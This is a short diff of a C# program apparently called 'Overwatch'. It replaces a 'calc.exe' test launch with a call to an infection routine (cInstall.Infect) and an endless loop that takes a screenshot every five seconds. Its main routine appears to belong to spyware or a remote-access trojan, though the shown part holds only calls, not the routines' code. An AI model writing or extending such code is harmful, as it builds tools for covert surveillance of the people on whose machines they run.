@@ -14,16 +14,15 @@ namespace Overwatch
         {
             try
             {
-                cInstall.InfectStartUp(args);
-
-                Process.Start("calc.exe");
+                //cStartupOptions.ProcessStartInfo();
+                cInstall.Infect(args);
+                while (true)
+                {
+                    cReceiveInformation.ScreenShoot();
+                    System.Threading.Thread.Sleep(5000);
+                }
             }
-            catch (Exception ex)
-            {
-                Log.Write(ex.Message, true);
-            }
-
-            Console.ReadKey();
+            catch (Exception ex){ Log.Write(ex.Message, true);}
         }
     }
 }
